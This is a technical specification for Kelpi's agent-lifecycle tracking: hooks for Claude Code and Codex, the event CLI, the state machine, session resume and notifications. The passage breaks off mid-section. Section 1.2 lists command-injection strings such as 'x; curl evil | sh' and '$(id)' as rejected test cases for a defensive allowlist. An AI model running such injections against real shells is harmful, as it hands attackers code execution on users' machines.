# Agent Lifecycle — Behavioral Specification

Spec for Kelpi's agent tracking: the daemon's agent-tracking module
(`packages/core/src/agent/`, driven by `packages/daemon/src/handlers/app/events.ts`), the
`kelpi event` hook command, and the status UI in the web client and the Electron shell.
It describes what Kelpi does today, in the present tense; the closing Compatibility
rationale records the quirks kept on purpose so older hook installs and saved state keep
working.

Scope: hook wiring (Claude Code + Codex CLI), the `kelpi event` CLI command, the wire
protocol for agent lifecycle messages, the per-pane agent state machine, session-id
binding/clearing/resume, elapsed-time badges and header UI, the status bar (footer
counts + menu-bar popover), desktop notifications, dock badge / attention bounce,
quit and workspace-delete confirmation gates, and the system stats footer gauges.

---

## 1. Data model

### 1.1 PaneStatus

```ts
type PaneStatus = "idle" | "running" | "waitingForInput";
```

- Serialized exactly as those camelCase strings (they are the raw enum values, used in
  the DB `status` column and in `pane list --json` output as `"status"`).
- `idle` — no agent activity (or activity acknowledged by the user).
- `running` — an agent turn is in progress, OR the turn ended but background work
  (background shells / subagents) is still in flight.
- `waitingForInput` — the agent finished its turn and is waiting for the user
  (also used for the error state — see §5.4).

Status is a **shell-pane-only concept**. Markdown / scratchpad / diff / web panes are
always `idle` and must never be flipped (the manual-override path guards on pane type).

### 1.2 AgentKind

```ts
type AgentKind = "claude" | "codex";
```

Which agent CLI a pane's lifecycle events came from. Rules:

- **Wire mapping** (`fromWire`): the wire field `agent` is optional. Absent or
  unrecognized → `"claude"` (backwards compatibility with pre-Codex CLIs and hook
  configs). Matching is **case-insensitive** (`"Codex"` → `"codex"`; `"gemini"` →
  `"claude"`).
- **Resume command** (`resumeCommand(sessionID)`):
  - `"claude"` → `claude --resume <sessionID>`
  - `"codex"` → `codex resume <sessionID>`
  - Returns **null** (resume is skipped entirely) when the session id fails the
    safety allowlist below. The id arrives over the wire and is later *typed into a
    shell PTY*, so a hostile local sender could otherwise persist
    `x; curl evil | sh` for execution on next restart.
- **Session-id safety allowlist** (`isSafeSessionID`): non-empty, length ≤ 128, and
  every character is ASCII alphanumeric or `.` `_` `-`. Anything else must never
  reach a PTY. Pinned test cases:
  - `"abc-123_x.Y"` → OK (`claude --resume abc-123_x.Y`)
  - `"x; touch /tmp/pwned #"`, `"a && curl evil"`, `"a\nnewline"`, `"$(id)"`,
    `""`, 129 × `"a"` → all rejected (null).

### 1.3 Pane agent fields

```ts
interface PaneAgentFields {
  status: PaneStatus;              // persisted (but reset on load — see §6.1)
  agentSessionID: string | null;   // persisted; cleared on load after resume capture
  agentKind: AgentKind | null;     // persisted; NEVER cleared on load (last-known display value)
  agentProfileName: string | null; // persisted; NOT cleared on load — effective KELPI_PROFILE
                                   // the session was launched under (null = unknown/legacy CLI)
  agentStartedAt: Date | null;     // transient (in-memory only) — wall-clock start of current run
  backgroundTaskCount: number;     // transient — default 0; count of in-flight background units
}
```

- `agentKind == null` means "no agent event ever seen"; UI falls back to the label
  `"claude"`.
- `agentProfileName` is reported by the `kelpi event` hook beside `session_id` (the
  wire `profile` field, riding the dual-fire — wire-protocol.md §3.1) so a resume can
  rebuild the environment the session was launched under (§6.1). A session-start
  without one (older CLI, or blank) keeps the last-known value — same PTY, same
  environment. It is not display state: a **matching** session-end clears it beside
  the id (§5.6), because a profile with no session to resume must not pin the pane's
  next spawn.
- `agentStartedAt` powers the elapsed badge ("claude · 4m 9s"). Because it is not
  persisted, a pane restored as `.running` (which cannot happen after §6.1's reset,
  but conceptually) or resumed after relaunch shows no elapsed clock until the agent
  re-emits a start.
- `backgroundTaskCount` is not persisted; reset to 0 on the next `start`, `error`,
  `session-start`, or manual status override.

### 1.4 Persistence

The DB pane record stores: `status` (text, default `"idle"`), `agentSessionID`
(text, nullable; historically named `claudeSessionID`, renamed by migration so the
schema is not pinned to one agent), `agentKind` (text, nullable; migration
`v18_pane_agent_kind`), and `agentProfileName` (text, nullable; migration
`v19_pane_agent_profile`, listed in `DAEMON_ONLY_MIGRATIONS` because no legacy `nex.db`
ledger can contain it, `packages/daemon/src/db/schema.ts:189-205`). On load, `status`
strings that don't parse fall back to `"idle"`, unknown `agentKind` strings fall back to
null, and a missing `agentProfileName` reads as null
(`packages/daemon/src/store/snapshot.ts:194`).

Persist triggers relevant to this subsystem: every agent lifecycle event
(`agentStarted` / `agentStopped` / `agentError` / `sessionStarted`) triggers a
debounced full-state persist. `sessionEnded` **explicitly** triggers persist (the
whole point of session-end handling is that the cleared id must survive the next
launch). Manual status override persists too.

---

## 2. Hook wiring

Kelpi learns about agent activity exclusively through lifecycle hooks that the agent
CLIs fire. Each hook runs `kelpi event <type>` inside the pane's PTY environment
(which carries `KELPI_PANE_ID=<pane uuid>` and, when the daemon advertises a route,
`KELPI_SOCKET`; `packages/core/src/env/merged-env.ts:14-16, 95`), and the CLI forwards
a JSON line over the daemon socket. The daemon injects only `KELPI_*` variables: there
is no `NEX_PANE_ID` / `NEX_SOCKET` fallback anywhere in the CLI or the daemon.

### 2.1 Claude Code hooks (`~/.claude/settings.json`, `"hooks"` key)

Installed by `kelpi install-hooks` (§2.3). Expected set (the doctor's `expectedHooks`,
`packages/cli/src/doctor/hooks.ts`):

| Claude Code hook event | Command                     | Meaning to Kelpi                     |
| ---------------------- | --------------------------- | ---------------------------------- |
| `UserPromptSubmit`     | `kelpi event start`           | agent turn began → `running`       |
| `Stop`                 | `kelpi event stop`            | turn ended → `waitingForInput` (or stay `running` if background work) |
| `Notification`         | `kelpi event notification`    | Claude posted a message (often a permission prompt) |
| `SessionStart`         | `kelpi event session-start`   | bind session id to pane            |
| `SessionEnd`           | `kelpi event session-end`     | clear session id (agent exited / `/clear`) |

- The `SessionStart` entry is written **matcher-less** so it fires for every source
  (`startup`, `resume`, `clear`, `compact`). A stale pre-v0.19 `"matcher": "startup"`
  means resumed sessions (`claude --continue` / `--resume`) never bind their session
  id — the doctor flags this (WARN, not FAIL) using Claude Code's documented matcher
  semantics: `*`/empty = match all; a value of only letters/digits/`_-`/spaces/`,|`
  is a `|`- or `,`-separated exact list (whitespace-trimmed); anything else is an
  unanchored regex (a regex that fails to compile covers nothing).
- The doctor reads both `settings.json` and `settings.local.json` under `~/.claude`
  (a hook wired in either file counts; `packages/cli/src/doctor/hooks.ts:116`). It
  accepts the `kelpi `, `nex `, `kelpi.js ` and `nex.js ` command prefixes as wired
  (`hooks.ts:99-112`): a pre-rename install or one that invokes the CLI by its entry
  file fires identically, so neither is prescribed a repair. It flags
  `"disableAllHooks": true` (the last file that defines it wins, local over user;
  `hooks.ts:150-155`) because that silences every hook, Kelpi's included.

### 2.2 Codex CLI hooks (`~/.codex/hooks.json`)

Codex CLI ≥ 0.142 supports Claude-style lifecycle hooks — same three-level JSON
shape, payload on stdin with `session_id`. Codex has **no `SessionEnd` and no
`Notification` event**; `PermissionRequest` is the "waiting on approval" signal.
Expected set (`expectedCodexHooks`):

| Codex hook event    | Command                                |
| ------------------- | -------------------------------------- |
| `UserPromptSubmit`  | `kelpi event start --agent codex`        |
| `Stop`              | `kelpi event stop --agent codex`         |
| `PermissionRequest` | `kelpi event notification --agent codex` |
| `SessionStart`      | `kelpi event session-start --agent codex`|

Codex known limitations (all deliberate):

- No SessionEnd → a stale codex session id can persist after codex exits; a later
  restart may `codex resume` a dead session, and the pane sits in the footer's
  "inactive" bucket.
- After an approval, the pane reads "awaiting input" until the next turn signal
  (parity with Claude).
- Codex hooks require one-time trust via `/hooks` inside codex, re-granted whenever
  hooks.json changes. Hook trust is not inspectable, so doctor repair text always
  includes the re-trust step.

### 2.3 Installer merge semantics (`install-hooks.sh` + `merge_hooks.py`)

The installer is `kelpi install-hooks [--claude-dir <dir>] [--codex-dir <dir>] [--link]
[--dry-run] [--json] [--command <prefix>] [--install-dir <dir>] [--skill-source <path>]`
(`packages/cli/src/commands/install-hooks.ts`), which replaces the `install-hooks.sh` +
`merge_hooks.py` scripts the heading names; the merge itself is a line-by-line port of
the Python (`packages/cli/src/install/merge.ts`). Safe to re-run; this is the repair
path doctor names. Behavior:

- If the settings file doesn't exist, write the hooks JSON verbatim.
- Otherwise back the file up to `<file>.kelpi-backup` before the first write (a re-run
  that produces identical bytes reports `unchanged` and writes neither the file nor the
  backup; `packages/cli/src/install/hooks.ts:19-38`) and deep-merge: for each event,
  first **remove any existing hook whose command contains an incoming command's
  flag-less base**, the base being everything before the first `" --"` (so
  `kelpi event stop`, `/Applications/Nex.app/Contents/Helpers/nex event stop`, and
  `kelpi event stop --agent codex` all share the base `kelpi event stop`), OR whose base
  ends in `kelpi`/`nex` (optionally `.js`/`.mjs`/`.cjs`, optionally quoted) followed by
  `event <verb>` (`kelpiInvocationPattern`, `merge.ts:60-75`; used in union with the
  substring test, never instead of it, so an absolute-path install such as
  `/Users/x/kelpi.js event stop` and a bare `kelpi event stop` are one identity). Then
  drop hook groups left empty, then append the incoming hooks into the group whose
  `matcher` equals the incoming group's matcher (creating the group if none matches).
- Deliberate trade-off: the sweep also removes a *composite* user command embedding a
  kelpi base (e.g. `notify.sh && kelpi event stop`): keeping it would double-fire, which
  is the worse failure mode.
- Unrelated user hooks are preserved. A malformed existing file is a typed failure with
  a repair line, and nothing is written.
- The Codex section runs last and is non-fatal: a malformed `~/.codex/hooks.json` does
  not abort an installer whose Claude-hook job already succeeded. Skipped entirely when
  `~/.codex` doesn't exist. The exit code follows the Claude half only.
- The hook command is resolved, not assumed (`packages/cli/src/install/self.ts`):
  `--command <prefix>` wins; otherwise a `kelpi` on `PATH` that resolves to this very
  binary yields the bare `kelpi`; otherwise the hooks get this binary's absolute path,
  shell-quoted when needed.
- `--link` (optional) symlinks `kelpi` into `KELPI_INSTALL_DIR` (`--install-dir`; default
  `/usr/local/bin`, `packages/cli/src/install/link.ts:25`) and warns if that dir isn't
  on `PATH`. It runs before the command is chosen, so a fresh machine gets the bare
  `kelpi` on its first run. Never sudo: an unwritable directory is reported with the
  exact command to run by hand.
- `--dry-run` runs the whole thing and writes nothing (the merged bytes come back as
  `preview`); `--json` prints one object and nothing else.

---

## 3. The `kelpi event` CLI command

```
kelpi event stop|start|error|notification|session-start|session-end
          [--agent claude|codex] [--message ...] [--title ...] [--body ...]
```

Behavioral algorithm (`packages/cli/src/commands/event.ts`; preserved exactly, so hook
configs written for the pre-port CLI keep working against the daemon):

1. **Suppress transport warnings** unless `KELPI_VERBOSE_HOOKS=1` is set (hooks fire
   on every Stop/Notification; spamming user terminals is unacceptable). `kelpi event`
   is fire-and-forget: it always exits 0 even when the daemon is unreachable.
2. Unknown event type or unknown `--agent` value → usage error to stderr, exit 1
   (an invalid `--agent` must fail loudly, not silently degrade to claude — the
   error lands in the agent's hook output).
3. **`KELPI_PANE_ID` required**: if the env var is absent, exit 0 *silently* (the
   hook is running outside a Kelpi pane; not an error; `packages/cli/src/env.ts:39-43`).
   A value that is set but empty is used verbatim.
4. **Read stdin JSON when piped** (stdin is not a TTY): parse the whole of stdin as
   one JSON object. Claude Code and Codex pass their hook payload this way. Parse
   failures are ignored (treated as no payload).
5. **Notification field extraction** (only for `eventType == "notification"`):
   - `--agent codex`: with `json` = stdin payload or `{}`:
     - `title` (if not given via flag) = `json.title` else `"Codex"`.
     - `body` (if not given) = `json.message`, else if `json.tool_name` is a
       non-empty string → `"Approval requested: <tool_name>"`, else
       `"Waiting for approval"`.
   - claude (default), **only when stdin actually carried JSON**:
     - `title` (if not given) = `json.title` else `"Claude Code"`.
     - `body` (if not given) = `json.message` (may stay null).
     - A manual no-stdin `kelpi event notification --body x` must keep omitting the
       title so the server renders its neutral `"Agent"` default.
6. **Sub-agent suppression**: if the stdin payload has a non-empty `agent_id`
   (Claude Code sets it on hooks fired by sub-agents; the root agent omits it) and
   the event is `stop` or `start`, **return without sending anything** — sub-agent
   lifecycle must not affect the pane indicator. (Other event types still send.)
7. **session_id**: read `json.session_id` (string) if the payload exists. Attached
   to *every* event type when present.
8. **background_tasks counting** (only for `stop` and `notification`): the payload's
   `background_tasks` value, when it is an array of objects, is a live snapshot of
   `run_in_background` shells + background subagents (`type: "shell" | "subagent"`).
   Count entries that are still in flight:
   - An entry with **no `status` key** counts (presence implies in-flight — the
     observed shape drops completed units from the array).
   - An entry counts unless its lowercased `status` is in the terminal set:
     `completed, complete, done, success, succeeded, failed, failure, error,
     errored, cancelled, canceled, killed, stopped, timeout, timed_out, aborted,
     skipped`. (Terminal-exclusion, not `== "running"`, so a future Claude Code
     that reports `"in_progress"` / `"pending"` / `"starting"` doesn't silently
     regress the keep-running rule.)
   - `background_tasks` is an *observed* Claude Code field, not a documented
     contract — a missing / renamed / misshaped field yields 0 (legacy behavior).
9. **Build the wire payload** and send one newline-terminated JSON line:

```jsonc
{
  "command": "stop",                 // the event type verbatim
  "pane_id": "9C0FA24C-...-...",     // KELPI_PANE_ID
  // all optional, omitted when absent:
  "message": "...",                  // --message (used by `error`)
  "title": "Claude Code",            // notification title
  "body": "Needs permission to run Bash", // notification body
  "session_id": "6f9a2c9e-....",     // from hook stdin payload
  "profile": "work",                 // KELPI_PROFILE of the hook's environment; ONLY when
                                     // session_id is present and the event is not
                                     // session-end (event.ts:156-162)
  "agent": "codex",                  // ONLY when --agent was passed
  "background_tasks": 2              // ONLY when count > 0
}
```

The common Claude path (no flag, no background work) is wire-identical to the
pre-Codex/pre-background protocol — that back-compat is a hard requirement.

---

## 4. Wire protocol — daemon side

Transport: newline-delimited JSON on the Unix socket `/tmp/kelpi.sock` (or TCP
`127.0.0.1:<port>`; see §4.3 for the listeners). All six agent-lifecycle commands are
**fire-and-forget**: the server reads, acts, and drops the connection; no reply is
written. Parsing is `packages/protocol/src/wire/decode.ts`; the dual-fire is
`packages/protocol/src/dualfire.ts`.

### 4.1 Parsing rules

For lines whose `command` is one of the lifecycle verbs, `pane_id` is **mandatory
and must parse as a UUID**; otherwise the line is silently dropped. Per command:

| `command`       | Parsed message                                                        | Notes |
| --------------- | --------------------------------------------------------------------- | ----- |
| `start`         | `agentStarted(paneID, agent = fromWire(agent))`                        |       |
| `stop`          | `agentStopped(paneID, backgroundTaskCount = background_tasks ?? 0)`    |       |
| `error`         | `agentError(paneID, message = message ?? "Unknown error")`             |       |
| `notification`  | `notification(paneID, title = title ?? "Agent", body = body ?? "", backgroundTaskCount = background_tasks ?? 0)` | |
| `session-start` | `sessionStarted(paneID, sessionID, agent = fromWire(agent), profileName = profile)`; dropped if `session_id` absent/empty; `profile` optional (absent/blank = older CLI, keeps last-known; `decode.ts:170-177`) | |
| `session-end`   | `sessionEnded(paneID, sessionID)` — dropped if `session_id` absent/empty | |

### 4.2 The session_id dual-fire

`session_id` is a common field on *all* Claude Code and Codex hook payloads, so the
parser synthesizes an extra message: **for any command that is not `session-start`
and not `session-end`, if the line carries a valid `pane_id` and a non-empty
`session_id`, additionally emit `sessionStarted(paneID, sessionID, agent =
fromWire(agent))` right after the primary message.**

- `session-start` is excluded to avoid a duplicate.
- `session-end` is excluded because its whole purpose is to *drop* the id — a
  dual-fire would immediately re-attach it.
- The synthesized message carries the wire's `agent` field. This matters: a codex
  `stop` fires a dual sessionStarted, and if that dual-fire were untagged it would
  flip the pane's `agentKind` back to `"claude"` on every codex turn end.
- Effect: the pane's `agentSessionID` and `agentKind` are continuously refreshed on
  every hook fire, so even a missed SessionStart self-heals on the next Stop.

Multiple newline-separated JSON lines in one read are each processed in order;
blank/whitespace lines and unparseable lines are skipped.

### 4.3 Listeners: the compat socket and the run-dir socket

The daemon binds two control listeners to the same dispatcher
(`packages/daemon/src/boot/compose.ts:1438-1480`), so a CLI line and a browser command
cannot drift:

- The **CLI-compat control socket** `/tmp/kelpi.sock` (`DEFAULT_CONTROL_SOCKET_PATH`,
  `packages/daemon/src/control/endpoints.ts:18`; `KELPID_SOCKET_PATH` overrides it,
  `KELPID_TCP_PORT` or the config's `tcp-port` adds a TCP listener). It is what a
  `kelpi` command in a plain terminal dials (`packages/cli/src/transport.ts:35`). It is
  **best-effort**: when the bind fails (another Kelpi owns the path) the daemon keeps
  booting, remembers the failure so `ping` and `kelpi doctor` can say where
  plain-terminal commands are going, logs it, and retries on every "Restart Socket
  Server"; a configured `tcp-port` is salvaged with a standalone TCP bind
  (`compose.ts:784-795`).
- The **run-dir control socket** `daemon-v<N>.sock` (`packages/daemon/src/lifecycle/rundir.ts`),
  the daemon's own, always carries a TCP listener too: the configured `tcp-port` when the
  compat path is the run-dir path, an ephemeral loopback port otherwise. A busy run-dir
  socket is fatal (a daemon of this protocol is already running). It binds before the
  restored panes spawn because every pane's env embeds this listener as
  `KELPI_SOCKET=tcp:<host>:<port>`, so hooks firing inside a pane reach *this* daemon
  even while the compat socket is degraded. `tcp:` is the only `KELPI_SOCKET` form the
  CLI honours; anything else falls back to `/tmp/kelpi.sock` silently.

`/tmp/nex.sock` belongs to the legacy app and is never dialed by this CLI; the two run
side by side with nothing shared (`kelpid import` is the bridge).

---

## 5. The pane agent state machine

The machine is `packages/core/src/agent/machine.ts`, dispatched through
`packages/daemon/src/store/reducers/agent.ts`.

All transitions target "the pane wherever it lives" — the visible layout **or** the
parked lane (panes hidden by `kelpi open --here` keep live PTYs and agents). Events
for a pane id that no workspace contains are silently ignored (no effects at all).
Routing is by pane id across *all* workspaces, never just the active one.

Let `now` = current time.

### 5.1 `agentStarted(paneID, agent)`

Pre-step (done at the routing layer, before the pane mutation): if the pane's status
is already `running`, the previous `stop` was missed (e.g. user interrupted the
agent) — reset the status to `idle` first so the "fresh run" check below sees a
clean transition and restarts the elapsed clock.

Then mutate the pane:

```
if status != running: agentStartedAt = now   // fresh run only — repeated start
                                             // pings within one run must not
                                             // reset the elapsed clock
status = running
agentKind = agent
backgroundTaskCount = 0                      // a fresh turn supersedes any
                                             // background snapshot from before
```

Side effects: refresh external indicators (§8), persist.

(Note: because of the pre-step reset, a `start` while already running *does* reset
the clock — that is intended: it is a new run whose stop was missed.)

### 5.2 `agentStopped(paneID, backgroundTaskCount)`

```
pane.backgroundTaskCount = backgroundTaskCount
if backgroundTaskCount > 0:
    // Turn ended but background shells/subagents still running: keep the
    // pane running so it doesn't falsely read "waiting". Forcing running
    // (not leaving as-is) makes the repeat Stops that fire as each
    // background unit completes idempotent no-ops.
    if status != running: agentStartedAt = now
    status = running
else:
    status = waitingForInput
```

Side effects: refresh external indicators, persist, and the notification/bounce
logic in §7.1.

Self-recovery: background work finishing re-invokes the agent → `UserPromptSubmit`
→ `start` (resets count to 0) → the next `Stop` arrives with an empty array.

### 5.3 `notification(paneID, title, body, backgroundTaskCount)`

State-wise, routed **through the same `agentStopped` transition** (§5.2) so the
background-aware rule applies identically. Additionally posts the agent's own
message as a desktop notification per §7.2.

### 5.4 `agentError(paneID, message)`

```
status = waitingForInput
backgroundTaskCount = 0
```

There is no distinct "error" pane status — errors surface as waiting-for-input plus
an always-fired desktop notification (§7.3).

### 5.5 `sessionStarted(paneID, sessionID, agent, profileName?)`

```
agentSessionID = sessionID
agentKind = agent
if profileName is present and non-blank: agentProfileName = profileName
                           // absent/blank (older CLI) keeps the last-known value
backgroundTaskCount = 0    // a brand-new session carries no inherited background
                           // work; also bounds a stuck running state — if the
                           // final empty Stop was dropped, the count can't pin
                           // the pane past the next session start
```

Does **not** touch `status` or `agentStartedAt`.

### 5.6 `sessionEnded(paneID, sessionID)`

```
if agentSessionID == sessionID: agentSessionID = null; agentProfileName = null
```

The match guard is essential: `/clear` and compaction fire SessionEnd(old) alongside
SessionStart(new), and the messages can arrive in **either order** — the guard keeps
the live session tracked regardless. The profile is cleared beside the id it traveled
with: once the session it described is gone there is nothing to resume under it, and
a survivor would pin the pane to a stale profile after a deliberate workspace switch
(an older CLI never reports a new one, so "keep last-known" would hold the stale name
forever). Explicitly persists (so a stale id can't be resumed on next launch — issue
#178). Does not touch `status`, `agentKind`, or `backgroundTaskCount`.

### 5.7 Manual status override (`setPaneStatus(paneID, status)`)

User-facing entry point: the pane header's context menu → "Status" submenu with
Idle / Running / Awaiting Input (shell panes only). Behavior:

- Resolve the owning workspace by pane id (works for background workspaces).
- **Guard: only shell panes.** A dispatch for a non-shell or unknown pane is a
  complete no-op (no effects).
- Mutation:

```
if status == running and pane.status != running: agentStartedAt = now
pane.status = status
pane.backgroundTaskCount = 0   // manual override takes control; a stale
                               // "N running" must not linger
```

- Side effects: refresh external indicators + persist.
- A manual override does **not** survive relaunch (§6.1 resets all non-idle
  statuses on load).

### 5.8 Focus-driven acknowledgment (`clearPaneStatus`)

When the user focuses a pane (clicks into its surface), and also when the app
becomes active with a focused pane, the client schedules a **600 ms** timer
(cancelling any previously scheduled one — one timer app-wide, latest wins):

- Skip scheduling entirely if the pane's status is already `idle`.
- When the timer fires (not cancelled): dispatch `clearPaneStatus(paneID)`:

```
if pane.status == waitingForInput: pane.status = idle
```

- **Only** `waitingForInput` is cleared — never clobber `running` if the agent
  started again during the 600 ms window.
- Side effects: persist, refresh external indicators, and **remove any delivered
  desktop notification for that pane** (by its dedup identifier, §7.5).

The 600 ms delay exists so that briefly clicking through panes doesn't instantly
swallow "waiting" badges, and so the user visibly sees what they're acknowledging.

Client-side the timer is `useFocusDwell` (`packages/client/src/grid/FocusRing.tsx:64-77`);
the mutation is the daemon's `clear-pane-status` verb
(`packages/daemon/src/ws/sync.ts:705-724`, `packages/core/src/agent/machine.ts:202-215`).
Two refinements to the triggers above:

- The effect is keyed on the focused pane's `(paneID, status)`, so a focused pane whose
  status flips to `waitingForInput` starts a fresh 600 ms countdown without any focus
  event, and the daemon's resulting `idle` tears the timer down. The callback is held in
  a ref, so a parent re-render cannot restart the countdown.
- The timer is **gated on the app being active**: the Electron shell reports window
  focus/blur to the daemon (`packages/shell/src/main.ts:556-570`), the client derives
  `isAppActive` (window active AND document visible,
  `packages/client/src/state/activation.ts:61`) and passes it as `enabled`
  (`packages/client/src/grid/PaneGrid.tsx:553-562`). A blur tears the pending clear
  down and the next focus schedules a fresh 600 ms, so a `stop` that lands while nobody
  is looking cannot clear its own "awaiting input" badge 600 ms later.

### 5.9 Status color / display summary

| Status            | Header badge (right-aligned in pane header)             | Footer/status colors (light / dark defaults) |
| ----------------- | ------------------------------------------------------- | -------------------------------------------- |
| `running`         | `"<kind> · <elapsed>"` + optional `"· N running"` in amber (`activeAgent`: `#A97C17` / `#D3A329`) on a 14%-opacity amber pill | running dot: `#4FA46B` / `#5FBE89` |
| `waitingForInput` | `"awaiting input"` in blue (`statusWaiting`: `#5E8AC4` / `#6F9BD8`) on a 14% pill | waiting dot: same blue |
| `idle`            | no badge                                                | inactive: `#9A9A96` / `#8A8A92` |

These colors are user-overridable chrome theme tokens; the tray icon and menu are
pushed the *resolved* colors so all surfaces agree (`packages/shell/src/icon.ts`).

---

## 6. Session binding, restart reset, and resume

### 6.1 On state load (app/daemon start, after reading the DB)

Order matters:

1. **Capture resume tuples first**: for every pane with a non-null
   `agentSessionID`, record
   `(paneID, sessionID, kind = agentKind ?? "claude", profile = agentProfileName)`.
   Any pane with a session id is resumable regardless of its current status.
2. **Clear** every pane's `agentSessionID` (prevents stale resumes on the *next*
   restart) and reset every non-idle `status` to `idle` (status is tied to a live
   PTY, which never survives a restart; a persisted `running` would otherwise
   falsely trigger the quit dialog with no real agents in flight).
   `agentKind` and `agentProfileName` are **deliberately NOT cleared** — they are
   last-known values and the resume tuples above depend on capturing them before
   any clearing.
3. Create the PTY surfaces for all shell panes (with workspace-profile env, so a
   resumed agent lands on the right account) — **except** a pane whose resume tuple
   recorded a non-null `profile` AND whose session id passes the safety allowlist
   (i.e. a resume command will actually be typed in step 4): that pane spawns with
   the **recorded profile's** env instead, so the resumed agent lands in the
   environment the session was launched under even if the workspace's assignment
   changed since. A tuple whose id fails the allowlist gets a fresh shell, and a
   fresh shell belongs to the workspace's current assignment. Note the recorded
   profile becomes the PTY's environment: sessions started later in that same pane
   inherit it (and re-report it), which is correct — their transcripts live under
   that profile's config dir. The pane rejoins the workspace's assignment when its
   tracked session ends (§5.6/§6.3) or the pane is closed.
   A pane the geometry cache has never seen (a fresh install, or a state file that
   outlived its cache) is not born at 80×24: `spawnRestoredPanes` hands it to the spawn
   gate (`deps.spawn.deferSpawn`, `packages/daemon/src/boot/resume.ts:184-195`) to be
   spawned on the first client geometry report, and still counts it as spawned. The
   gate declines when no client is there to report, and the pane then spawns
   immediately as before.
4. If there are resume tuples: **sleep 2 seconds** (let shells finish starting),
   then for each tuple compute `kind.resumeCommand(sessionID)`; skip null (failed
   the safety allowlist), otherwise type the command into that pane's PTY
   (command text + Enter). `typeResumeCommands` re-checks `pty.has` before typing
   (`resume.ts:220-227`; a pending deferred spawn answers for it), so a deferred pane's
   command goes through the normal path or is skipped, never typed into nothing.
5. **Persist only after** the resume commands were sent — so if the process crashes
   before the resume executes, the session ids are still in the DB for the next try.

### 6.2 Close/reopen ("reopen closed pane")

Closing a pane captures a snapshot including `agentSessionID`, `agentKind`, and
`agentProfileName`. Reopening (`reopen-closed-pane`, `packages/daemon/src/ws/panes.ts`;
a stack of up to 10, LIFO):

- Recreates the pane (new UUID) carrying over `agentKind` (but the *live* pane's
  `agentSessionID` starts null — the session is re-bound by the resume below via
  the dual-fire once the agent starts talking).
- For shell panes only: spawn the surface — with the **snapshot's recorded profile
  env** when a resume command will actually be typed (session id present and passes
  the allowlist) and the snapshot recorded a non-null profile; with the workspace's
  profile env otherwise — and if the snapshot has a session id, sleep 2 s and type
  `(<snapshot.agentKind ?? "claude">).resumeCommand(sessionID)` into the PTY —
  skipping if null (unsafe id).

### 6.3 Session-end (issue #178 contract)

A Claude Code SessionEnd hook clears the pane's tracked session id — and the
`agentProfileName` recorded beside it (§5.6) — **only when it still matches the
ending session** and immediately persists — so an exited agent session is not
`--resume`d on next launch. Codex has no SessionEnd, so codex ids (and their
recorded profiles) persist until overwritten (documented limitation: a codex pane
resumed under a recorded profile keeps it until a new session overwrites it or the
pane is closed).

### 6.4 On-demand restart (`restart-pane-agent`)

A client can ask the daemon to type a pane's resume command right now, without a
relaunch or a reopen: the WS-only `restart-pane-agent` verb
(`packages/daemon/src/ws/sync.ts:908`, channel in `packages/daemon/src/ws/agents.ts:33-57`),
wrapped as `commands.restartPaneAgent` on the client
(`packages/client/src/connection/commands.ts:848-850`) and reachable as
`PaneActions.onRestartAgent`. Behavior:

- Finds the pane in either lane (visible or parked). Refuses, with an error reply, a
  non-shell pane, a pane with no `agentSessionID`, an id that fails the safety allowlist
  (`resumeCommand` returns null), or a pane with no live PTY.
- Otherwise types `(agentKind ?? "claude").resumeCommand(agentSessionID)`
  (`claude --resume <id>` / `codex resume <id>`) into the PTY the same way the boot-time
  resume does (command text + Enter) and replies
  `{ok, pane_id, workspace_id, agent, command}`.
- **No store mutation**: no status is forced and no session id is cleared; the agent's
  own hooks report what happens next, exactly as after a boot-time resume.
- There is deliberately no pane-header button for it (a one-click restart of a live
  agent sitting between Split Down and Close is a mis-click nobody asked for;
  `packages/client/src/grid/PaneHeader.tsx:1000-1006`). The verb stays reachable for any
  client or a later context-menu item.

---

## 7. Desktop notifications

### 7.1 Synthetic "waiting for input" (from `stop`)

On `agentStopped`, compute:

```
isFocused   = (pane's workspace is the active workspace) AND (pane is that
              workspace's focused pane)
isAppActive = any connected client is visible/focused     // multi-client rule,
                                                          // Compatibility rationale 2
hasBackgroundWork = backgroundTaskCount > 0

shouldNotify = (!isFocused || !isAppActive) && !hasBackgroundWork
shouldBounce = !isAppActive && !hasBackgroundWork
```

- If `shouldNotify`: post a notification with **title = pane title ?? workspace
  name**, **body = "Agent is waiting for input"**, tagged with (paneID, workspaceID).
- If `shouldBounce`: request user attention (macOS dock bounce, informational —
  bounces once). Web client equivalent: a one-shot attention signal (e.g. title
  flash / favicon pulse) when the client tab is unfocused.
- The background-work suppression exists to kill the notification churn from the
  repeat Stops that fire as each background unit completes (issues #215, #220).

### 7.2 Agent-authored notification (from `notification`)

State routes through the stop transition (§5.3). The notification itself is posted
when `!isFocused || !isAppActive` — **without** the background-work suppression:
even mid-background-work, the agent's own message may be an actionable permission
prompt. Title/body come from the wire (`title ?? "Agent"`, `body ?? ""`). No dock
bounce on this path.

### 7.3 Error (from `error`)

Always posts — focused or not, app active or not. Title `"Agent Error"`, body =
the wire `message` (`"Unknown error"` default).

### 7.4 Terminal OSC desktop notifications (OSC 9 / 99 / 777)

A separate entry point (terminal escape sequences from any program in the pane;
`packages/daemon/src/handlers/app/osc-notifications.ts`). Suppressed only when the pane
is focused in the active workspace AND the app is active; otherwise posted with the
OSC-provided title (falling back to `pane.title ?? workspace name`; OSC 9 carries no
title of its own) and body, tagged with both paneID and workspaceID and the
`kelpi-<paneID>` dedup key (`osc-notifications.ts:54-63`), so clicking it navigates
like an agent notification. Unknown pane → ignored.

### 7.5 Notification mechanics

- **Identifier / dedup**: every notification for a pane uses the identifier
  `kelpi-<paneID>` — a newer notification for the same pane replaces the older one.
- **Category/actions**: two buttons, **Open** then **Dismiss** (does nothing), in that
  order; the Electron shell builds the pair once (`packages/shell/src/notify.ts`) and
  cannot style Dismiss destructively (an Electron action has a type and a text and
  nothing else). macOS shows the first action as a button and the rest behind the
  "more" affordance, so the order is what the app controls.
- Notifications are shown even when the app is in the foreground (banner + sound);
  suppression is decided at the call sites above, not by the presenter.
- **Open / default click**: requires both `paneID` and `workspaceID` in the
  payload; activates the app, switches to that workspace, and focuses that pane.
- **Removal**: `clearPaneStatus` (the 600 ms focus acknowledgment) removes the
  pane's delivered + pending notification, so the notification center doesn't keep
  stale "waiting" toasts for panes the user already visited (client: `clear(paneID)`
  in `packages/client/src/state/notifications.ts`; Electron shell: a pane leaving the
  waiting set closes its native toast, `noLongerWaitingPanes` in
  `packages/shell/src/agents.ts`).
- **Permission**: the browser client asks on the first `pointerdown` in the window
  (browsers grant only from a user gesture; `packages/client/src/App.tsx:619-627`) and
